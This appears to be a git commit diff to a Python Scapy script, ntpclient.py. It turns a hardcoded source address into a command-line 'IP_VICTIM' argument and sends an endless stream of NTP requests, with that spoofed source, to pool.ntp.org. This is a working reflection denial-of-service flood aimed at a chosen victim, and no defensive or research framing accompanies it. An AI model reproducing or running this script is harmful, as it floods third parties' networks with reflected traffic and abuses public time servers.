a7bfefdf010f29df711fe9e45c5c16ae586b49cc
root <root@localhost.localdomain>
2022-12-19 20:46:25 +0000

    Usage perform

--- ntpclient.py
+++ ntpclient.py
@@ -8,24 +8,31 @@ import sys
 import socket
 
 
-if len(sys.argv) > 2:
-    print("Usage python3 ntpclient.py 'IP_VICTIM'")
+if len(sys.argv) > 3 or len(sys.argv) < 2:
+    print("Usage python3 ntpclient.py 'IP_VICTIM' 'NTP_SERVER'")
     exit()
 
 # IP SPOOFER
-A = "127.0.0.1" # spoofed source IP address
 
-if (len(sys.argv) == 2):
-    B = sys.argv[1] # "pool.ntp.org" # destination IP address
+A = sys.argv[1] # spoofed source IP address
+
+#A = "127.0.0.1" # spoofed source IP address
+
+if (len(sys.argv) == 3):
+    B = sys.argv[2] # "pool.ntp.org" # destination IP address
 B = "pool.ntp.org"
 C = RandShort() # source port
 D = 80 # destination port
 payload = ("\x1b\x00\x00\x00"+"\x00"*11*4) # packet NTP payload 
 
+i = 1
 while True:
     spoofed_packet = IP(src=A, dst=B) / UDP(dport=123,sport=50000) / payload
     #sniff(prn=lambda x:x.summary(), count=5)
+    print(str(i) + "->")
+    i = i+1
     send(spoofed_packet)
+    
 # rep,non_rep = sr(spoofed_packet)
 
 
